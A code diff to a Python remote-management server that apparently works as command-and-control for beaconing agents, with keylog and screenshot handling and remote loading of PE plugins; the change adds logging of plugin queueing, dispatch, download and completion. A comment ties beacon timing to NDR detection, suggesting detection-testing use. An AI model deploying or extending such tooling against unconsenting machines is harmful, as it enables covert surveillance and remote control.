@@ -203,6 +203,19 @@ def list_plugin_files() -> list[dict]:
     return plugins
 
 
+def plugin_command_metadata(command: str) -> dict | None:
+    """Extract safe plugin identity metadata from a queued agent command."""
+    fields = str(command or "").split("\n", 1)[0].split(None, 3)
+    if fields and fields[0] == "__SCREENSHOT__":
+        return {"plugin": "screenshot.dll", "export": "Run"}
+    if len(fields) < 3 or fields[0] != "__PE_LOAD__":
+        return None
+    plugin, export = fields[1], fields[2]
+    if not PLUGIN_NAME_RE.fullmatch(plugin) or not PLUGIN_EXPORT_RE.fullmatch(export):
+        return None
+    return {"plugin": plugin, "export": export}
+
+
 # Cross-compile timeout for server-side Go PE plugin builds. Override with
 # RMM_PLUGIN_BUILD_TIMEOUT. The first rclone-based build far exceeds the
 # agent's 120-second budget because every backend is compiled once.
@@ -564,6 +577,7 @@ class Session:
         self.wait_result = None
         self.download_artifacts = []
         self.pending_downloads = deque()
+        self.pending_plugin_runs = deque()
         # True once operator/client config is known; defers idle __CONFIG__ until then.
         self.config_synced = False
         self.config_pending = False
@@ -1882,6 +1896,7 @@ class RMMServer:
         session = self.get_session(session_id)
         if not session:
             return False
+        plugin_meta = plugin_command_metadata(command)
         with self.session_lock:
             if command == "__STOP__":
                 session.persistent_cmd = None
@@ -1889,8 +1904,14 @@ class RMMServer:
             if cmd_type == "persistent":
                 session.cmd_queue.clear()
                 session.persistent_cmd = command
-                return True
-            session.cmd_queue.append(command)
+            else:
+                session.cmd_queue.append(command)
+        if plugin_meta:
+            self.log(
+                f"Plugin queued: session={session.id[:8]} plugin={plugin_meta['plugin']} "
+                f"export={plugin_meta['export']} mode={cmd_type}",
+                "CMD",
+            )
         return True
     
     def get_command(self, session_id):
@@ -1905,22 +1926,36 @@ class RMMServer:
         if not session:
             return ("", "none")
         self.touch_session(session_id)
+        dispatch_log = None
         with self.session_lock:
             if session.persistent_cmd is not None:
-                return (session.persistent_cmd, "persistent")
-            if session.cmd_queue:
+                cmd = session.persistent_cmd
+                response = (cmd, "persistent")
+            elif session.cmd_queue:
                 cmd = session.cmd_queue.popleft()
-                return (cmd, "execute")
-            if session.config_pending:
+                response = (cmd, "execute")
+            elif session.config_pending:
                 session.config_pending = False
                 config_cmd = f"__CONFIG__ {session.sleep_seconds} {session.jitter_percent}"
-                return (config_cmd, "config")
-            # Idle: no commands and no pending config update.
-            # Do NOT push __CONFIG__ here — the agent keeps its own sleep/jitter defaults
-            # until the operator explicitly changes them via PATCH (sets config_pending=True).
-            # Pushing config on every empty beacon caused the agent to inherit a persisted
-            # 60-second sleep_seconds, breaking 5-second C2 beacon detection in NDR tools.
-            return ("", "none")
+                response = (config_cmd, "config")
+            else:
+                # Idle: no commands and no pending config update.
+                # Do NOT push __CONFIG__ here — the agent keeps its own sleep/jitter defaults
+                # until the operator explicitly changes them via PATCH (sets config_pending=True).
+                # Pushing config on every empty beacon caused the agent to inherit a persisted
+                # 60-second sleep_seconds, breaking 5-second C2 beacon detection in NDR tools.
+                response = ("", "none")
+            plugin_meta = plugin_command_metadata(response[0])
+            if plugin_meta and response[1] in ("execute", "persistent"):
+                plugin_meta["started_at"] = time.monotonic()
+                session.pending_plugin_runs.append(plugin_meta)
+                dispatch_log = (
+                    f"Plugin dispatched: session={session.id[:8]} plugin={plugin_meta['plugin']} "
+                    f"export={plugin_meta['export']}"
+                )
+        if dispatch_log:
+            self.log(dispatch_log, "INFO")
+        return response
 
     @staticmethod
     def _unwrap_rmm_result_text(body: str) -> tuple:
@@ -1973,12 +2008,19 @@ class RMMServer:
         if not session:
             return
         self.touch_session(session_id)
+        with self.session_lock:
+            plugin_meta = (
+                session.pending_plugin_runs.popleft()
+                if session.pending_plugin_runs
+                else None
+            )
 
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
         tty_lines = []
         artifact = None
         event_body = result
         echoed_cmd = None
+        plugin_result_failed = False
 
         if cmd_type == "file_upload":
             try:
@@ -2017,6 +2059,7 @@ class RMMServer:
             except Exception as e:
                 event_body = str(e)
                 tty_lines.append(("log", f"Screenshot error: {e}", "ERROR"))
+                plugin_result_failed = True
 
         elif cmd_type == "keylog":
             try:
@@ -2091,11 +2134,27 @@ class RMMServer:
         else:
             text, echoed_cmd = self._unwrap_rmm_result_text(result)
             event_body = text
+            if result.startswith(("Plugin failed:", "Screenshot failed:")):
+                plugin_result_failed = True
             line = f"\n{Colors.DIM}[Result from {session}]"
             if echoed_cmd:
                 line += f" » {echoed_cmd}"
             line += f"{Colors.END}"
             tty_lines.append(("result", line, text))
+
+        if plugin_meta:
+            elapsed_ms = max(
+                0,
+                int((time.monotonic() - plugin_meta["started_at"]) * 1000),
+            )
+            status = "failed" if plugin_result_failed else "completed"
+            level = "ERROR" if plugin_result_failed else "SUCCESS"
+            self.log(
+                f"Plugin {status}: session={session.id[:8]} plugin={plugin_meta['plugin']} "
+                f"export={plugin_meta['export']} result_type={cmd_type} "
+                f"output_bytes={len(result)} elapsed_ms={elapsed_ms}",
+                level,
+            )
 
         self._record_event(session, cmd_type, event_body, command=echoed_cmd, artifact=artifact)
 
@@ -2362,7 +2421,7 @@ class RMMHandler(BaseHTTPRequestHandler):
         self._safe_write(data)
         return True
 
-    def _serve_plugin_tool(self, name: str) -> bool:
+    def _serve_plugin_tool(self, name: str, session_id: str | None = None) -> bool:
         """Beacon-authenticated download of one PE plugin for the Go agent."""
         if not PLUGIN_NAME_RE.match(name):
             self._respond(400, "Invalid plugin name")
@@ -2383,6 +2442,13 @@ class RMMHandler(BaseHTTPRequestHandler):
         self.send_header("Cache-Control", "no-cache")
         self.end_headers()
         self._safe_write(data)
+        server = getattr(self, "server_instance", None)
+        if server is not None:
+            server.log(
+                f"Plugin downloaded: session={(session_id or 'unknown')[:8]} "
+                f"plugin={name} bytes={len(data)}",
+                "INFO",
+            )
         return True
 
     def _serve_web(self, path: str) -> bool:
@@ -3016,7 +3082,7 @@ class RMMHandler(BaseHTTPRequestHandler):
             if not self.server_instance.get_session(session_id):
                 self._respond(404, "Unknown session")
                 return
-            if self._serve_plugin_tool(plugin_name):
+            if self._serve_plugin_tool(plugin_name, session_id):
                 return
 
         if self._serve_web(path):
